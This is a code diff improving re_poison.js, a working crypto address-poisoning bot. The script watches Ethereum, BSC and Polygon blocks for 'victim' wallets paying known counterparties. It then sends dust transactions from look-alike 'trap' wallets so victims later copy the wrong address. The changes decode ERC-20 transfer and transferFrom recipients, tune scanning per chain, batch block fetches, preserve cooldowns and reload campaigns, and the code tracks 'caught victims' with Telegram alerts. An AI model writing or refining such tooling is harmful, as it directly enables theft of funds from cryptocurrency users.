@@ -22,12 +22,21 @@ const execAsync = promisify(exec);
 
 console.log('[DEBUG] Starting optimized re_poison.js...');
 
-// --- Supabase Service Client (bypass RLS) ---
+// --- Supabase Service Client (bypass RLS) with connection pool limits ---
 const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
 const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
 let supabaseService = null;
 if (supabaseUrl && supabaseServiceKey) {
-  supabaseService = createClient(supabaseUrl, supabaseServiceKey);
+  supabaseService = createClient(supabaseUrl, supabaseServiceKey, {
+    global: {
+      fetch: (url, options = {}) => {
+        return fetch(url, {
+          ...options,
+          signal: AbortSignal.timeout(30000),
+        });
+      },
+    },
+  });
   console.log('[DEBUG] Supabase service client initialized');
 } else {
   console.warn('[DEBUG] Supabase service credentials missing – campaign lookup disabled');
@@ -44,6 +53,7 @@ const {
 const victims = new Map();
 let blockPollInterval = null;
 let caughtVictimsPollInterval = null;
+let trapsReloadInterval = null;
 let lastBlockProcessed = 0n;
 
 // Async Mutex Lock to prevent RPC exhaustion and concurrent Python spawns
@@ -126,11 +136,12 @@ async function loadTrapsFromDB() {
         const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
         const campaignId = row.campaign_id;
 
+        const existing = victims.get(victim);
         victims.set(victim, {
           privateKey,
           trapAddress: row.trap_address.toLowerCase(),
           counterparty,
-          lastPoison: 0,
+          lastPoison: existing ? existing.lastPoison : 0, // ✅ Preserve cooldown state
           campaignId,
         });
         loaded++;
@@ -176,7 +187,15 @@ console.log('[DEBUG] delayBetweenMs:', delayBetweenMs);
 const COOLDOWN_MS = cooldownMs || 60 * 60 * 1000;
 const DUST_RETRIES = dustRetries || 2;
 const DELAY_BETWEEN_DUST_MS = delayBetweenMs || 2000;
-const EXEC_TIMEOUT_MS = 180000; 
+const EXEC_TIMEOUT_MS = 180000;
+
+// 🚀 Chain-aware scanning parameters
+const CHAIN_SCAN_CONFIG = {
+  ethereum: { blockTimeMs: 12000, pollIntervalMs: 15000, maxBlocksPerScan: 5 },
+  bsc: { blockTimeMs: 3000, pollIntervalMs: 6000, maxBlocksPerScan: 30 },
+  polygon: { blockTimeMs: 2000, pollIntervalMs: 5000, maxBlocksPerScan: 40 },
+};
+const scanConfig = CHAIN_SCAN_CONFIG[chainName] || CHAIN_SCAN_CONFIG.ethereum;
 
 // --- Dynamic cooldown limits ---
 const MIN_COOLDOWN_MS = parseInt(process.env.MIN_COOLDOWN_MS || '600000', 10);
@@ -286,7 +305,7 @@ function getDynamicCooldown(victimAddress) {
 function getAssetFromTx(tx) {
   if (!tx || !tx.to) return null;
   const to = tx.to.toLowerCase();
-  
+
   const tokenSymbol = tokenAddressMap.get(to);
   if (tokenSymbol) {
     return tokenSymbol;
@@ -314,16 +333,14 @@ async function sendDust(privateKey, victimAddress, campaignId, asset = null) {
     const { stdout, stderr } = await execAsync(cmd, { timeout: EXEC_TIMEOUT_MS, env });
     if (stderr) logger.warn(`duster stderr: ${stderr}`);
     logger.info(`duster stdout: ${stdout.trim()}`);
-    
-    // 🚀 NEW: Extract TX hash from stdout (matches 0x followed by 64 hex chars)
+
     const txHashMatch = stdout.match(/0x[a-fA-F0-9]{64}/);
-    return txHashMatch ? txHashMatch[0] : true; // Return hash if found, otherwise true for success
-   } catch (error) {
+    return txHashMatch ? txHashMatch[0] : true;
+  } catch (error) {
     if (error.killed && error.signal === 'SIGTERM') {
       logger.error(`duster timed out after ${EXEC_TIMEOUT_MS}ms`);
     } else {
       logger.error(`duster error: ${error.message}`);
-      // 🚨 CRITICAL: Log the actual Python output to see exactly WHY it failed
       if (error.stdout) logger.info(`duster stdout (failed): ${error.stdout.trim()}`);
       if (error.stderr) logger.warn(`duster stderr (failed): ${error.stderr.trim()}`);
     }
@@ -344,21 +361,18 @@ async function poisonVictim(victimAddress, privateKey, campaignId, asset = null)
       if (typeof result === 'string' && result.startsWith('0x')) {
         txHash = result;
       }
-      // 🚀 OPTIMIZATION: Break early if successful to save time and prevent duplicate attempts
-      break; 
+      break;
     }
     if (i < DUST_RETRIES - 1) {
       await new Promise(resolve => setTimeout(resolve, DELAY_BETWEEN_DUST_MS));
     }
   }
 
-  // 🚀 NEW: Clearly distinguish between success and failure in the message
   const txHashMsg = txHash ? `\n🔗 TX: ${txHash}` : '';
   const statusMsg = successCount > 0 ? 'Re‑poison complete' : 'Re‑poison failed';
   const msg = `${statusMsg}: ${successCount}/${DUST_RETRIES} dust tx sent to ${victimAddress}${txHashMsg}`;
   logger.info(msg);
 
-  // 🚀 THROTTLE: Only send Telegram alert if it actually succeeded, to save DB/Telegram API limits
   if (successCount > 0) {
     try {
       await sendAlert(`♻️ ${msg}`, 'info', campaignId);
@@ -401,7 +415,6 @@ function checkTransaction(tx) {
   if (processedTxHashes.has(hash)) return;
   processedTxHashes.set(hash, now);
 
-  // 🚀 OPTIMIZATION: Clearing the map is O(1) and prevents CPU spikes from iterative deletion
   if (processedTxHashes.size > 50000) {
     processedTxHashes.clear();
     logger.debug('Cleared processedTxHashes map to prevent memory bloat');
@@ -409,6 +422,7 @@ function checkTransaction(tx) {
 
   // Caught victim exclusion
   if (caughtVictims.has(from)) {
+    logger.debug(`[skip] ${from} is a caught victim, removing from active map`);
     victims.delete(from);
     return;
   }
@@ -417,8 +431,27 @@ function checkTransaction(tx) {
 
   const entry = victims.get(from);
 
-  // Counterparty wildcard check
-  if (entry.counterparty && to !== entry.counterparty) {
+  // 🚀 FIX BUG #1: Extract actual recipient from ERC-20 transfer
+  let actualRecipient = to;
+
+  // Check if this is an ERC-20 transfer(address,uint256) - selector 0xa9059cbb
+  if (tx.input && tx.input.startsWith('0xa9059cbb') && tx.input.length >= 138) {
+    // Extract recipient from input data (bytes 16-36 after 0x prefix = chars 34-74)
+    actualRecipient = '0x' + tx.input.slice(34, 74).toLowerCase();
+    logger.debug(`[ERC20] Detected token transfer: ${from} → ${actualRecipient} via ${to}`);
+  }
+  // Check if this is an ERC-20 transferFrom(address,address,uint256) - selector 0x23b872dd
+  // Used by DEX routers (Uniswap, PancakeSwap, 1inch, etc.)
+  else if (tx.input && tx.input.startsWith('0x23b872dd') && tx.input.length >= 202) {
+    // transferFrom signature: transferFrom(address from, address to, uint256 value)
+    // Extract 'to' address (second parameter) from input data (bytes 48-68 = chars 98-138)
+    actualRecipient = '0x' + tx.input.slice(98, 138).toLowerCase();
+    logger.debug(`[ERC20] Detected token transferFrom: ${from} → ${actualRecipient} via ${to}`);
+  }
+
+  // Counterparty wildcard check using actual recipient
+  if (entry.counterparty && actualRecipient !== entry.counterparty) {
+    logger.debug(`[skip] ${from} sent to ${actualRecipient} but counterparty is ${entry.counterparty}`);
     return;
   }
 
@@ -429,17 +462,20 @@ function checkTransaction(tx) {
     victimTxTimestamps.set(from, timestamps);
   }
   timestamps.push(Date.now());
-  
+
   if (timestamps.length > 10) {
     timestamps.shift();
   }
 
   const dynamicCooldown = getDynamicCooldown(from);
-  if (now - entry.lastPoison < dynamicCooldown) return;
+  if (now - entry.lastPoison < dynamicCooldown) {
+    logger.debug(`[skip] ${from} on cooldown (${Math.round((dynamicCooldown - (now - entry.lastPoison)) / 1000)}s remaining)`);
+    return;
+  }
 
   // 🚀 PREVENT CONCURRENT PYTHON SPAWNS
   if (trapLocks.get(entry.privateKey)) {
-    console.log(`[DEBUG] Trap wallet for victim ${from} is currently busy. Skipping.`);
+    logger.debug(`[skip] Trap wallet for victim ${from} is currently busy. Skipping.`);
     return;
   }
   trapLocks.set(entry.privateKey, true);
@@ -474,8 +510,6 @@ function checkTransaction(tx) {
 }
 
 // --- Block scanner ---
-const MAX_BLOCKS_PER_SCAN = 20; // 🚀 Prevent catch-up storms
-
 async function scanNewBlocks() {
   if (isScanning) return;
   isScanning = true;
@@ -487,9 +521,9 @@ async function scanNewBlocks() {
       2,
       1000
     );
-    
+
     if (lastBlockProcessed === 0n) {
-      lastBlockProcessed = currentBlock > 5n ? currentBlock - 5n : 0n;
+      lastBlockProcessed = currentBlock > 2n ? currentBlock - 2n : 0n;
       console.log(`[DEBUG] Initial block set to ${lastBlockProcessed}`);
       isScanning = false;
       return;
@@ -499,31 +533,56 @@ async function scanNewBlocks() {
     let endBlock = currentBlock;
     const blockDiff = Number(endBlock - startBlock);
 
-    if (blockDiff > MAX_BLOCKS_PER_SCAN) {
-      logger.warn(`Fell behind by ${blockDiff} blocks. Capping scan to latest ${MAX_BLOCKS_PER_SCAN} blocks to prevent CPU/RPC overload.`);
-      startBlock = currentBlock - BigInt(MAX_BLOCKS_PER_SCAN) + 1n;
+    // 🚀 Use chain-specific max blocks
+    if (blockDiff > scanConfig.maxBlocksPerScan) {
+      logger.warn(`Fell behind by ${blockDiff} blocks. Capping to latest ${scanConfig.maxBlocksPerScan} blocks.`);
+      startBlock = currentBlock - BigInt(scanConfig.maxBlocksPerScan) + 1n;
     }
 
     if (startBlock <= endBlock) {
-      for (let block = startBlock; block <= endBlock; block++) {
-        const fullBlock = await withRpcRetry(
-          () => client.getBlock({ blockNumber: block, includeTransactions: true }),
-          `getBlock(${block})`,
-          2,
-          1000
+      // 🚀 Fetch blocks in parallel for speed (up to 5 at a time)
+      const blockNumbers = [];
+      for (let b = startBlock; b <= endBlock; b++) {
+        blockNumbers.push(b);
+      }
+
+      const batchSize = 5;
+      for (let i = 0; i < blockNumbers.length; i += batchSize) {
+        const batch = blockNumbers.slice(i, i + batchSize);
+        const blocks = await Promise.all(
+          batch.map(block =>
+            withRpcRetry(
+              () => client.getBlock({ blockNumber: block, includeTransactions: true }),
+              `getBlock(${block})`,
+              2,
+              1000
+            ).catch(err => {
+              logger.warn(`Failed to fetch block ${block}: ${err.message}`);
+              return null;
+            })
+          )
         );
 
-        if (fullBlock && fullBlock.transactions) {
-          for (const tx of fullBlock.transactions) {
-            try {
-              checkTransaction(tx);
-            } catch (err) {
-              logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
+        let highestSuccessfulBlock = lastBlockProcessed;
+        for (let i = 0; i < blocks.length; i++) {
+          const fullBlock = blocks[i];
+          const blockNum = batch[i];
+          if (fullBlock && fullBlock.transactions) {
+            for (const tx of fullBlock.transactions) {
+              try {
+                checkTransaction(tx);
+              } catch (err) {
+                logger.warn(`Error evaluating tx ${tx.hash}: ${err.message}`);
+              }
             }
+            highestSuccessfulBlock = BigInt(blockNum);
+          } else {
+            // Stop advancing if a block failed so it can be retried next cycle
+            break;
           }
         }
+        lastBlockProcessed = highestSuccessfulBlock;
       }
-      lastBlockProcessed = endBlock;
     }
   } catch (err) {
     logger.warn(`Block scan error: ${err.message}`);
@@ -535,7 +594,7 @@ async function scanNewBlocks() {
 // --- Start watcher ---
 function startWatcher() {
   console.log('[DEBUG] Starting block‑based watcher...');
-  logger.info('Watching new blocks for victim → counterparty transactions...');
+  logger.info(`Watching new blocks for victim → counterparty transactions (poll every ${scanConfig.pollIntervalMs / 1000}s)...`);
 
   (async () => {
     try {
@@ -546,12 +605,19 @@ function startWatcher() {
     }
   })();
 
-  blockPollInterval = setInterval(scanNewBlocks, 120000);
-  
-  // 🚀 THROTTLE: Poll caught victims every 2 minutes (120000ms) to save DB connections
+  // 🚀 Chain-aware polling interval
+  blockPollInterval = setInterval(scanNewBlocks, scanConfig.pollIntervalMs);
+
+  // Keep caught victims poll at 8 minutes
   caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);
 
-  console.log('[DEBUG] Watcher started.');
+  // 🚀 FIX BUG #2: Reload traps every 5 minutes to pick up new campaigns
+  trapsReloadInterval = setInterval(async () => {
+    console.log('[DEBUG] Reloading traps from database...');
+    await loadTrapsFromDB();
+  }, 300000);
+
+  console.log(`[DEBUG] Watcher started. Polling every ${scanConfig.pollIntervalMs / 1000}s, max ${scanConfig.maxBlocksPerScan} blocks per scan.`);
 }
 
 // --- Graceful shutdown ---
@@ -561,6 +627,7 @@ onShutdown(async () => {
   console.log('[DEBUG] Shutting down...');
   if (blockPollInterval) clearInterval(blockPollInterval);
   if (caughtVictimsPollInterval) clearInterval(caughtVictimsPollInterval);
+  if (trapsReloadInterval) clearInterval(trapsReloadInterval);
   console.log('[DEBUG] Intervals cleared.');
 });
 
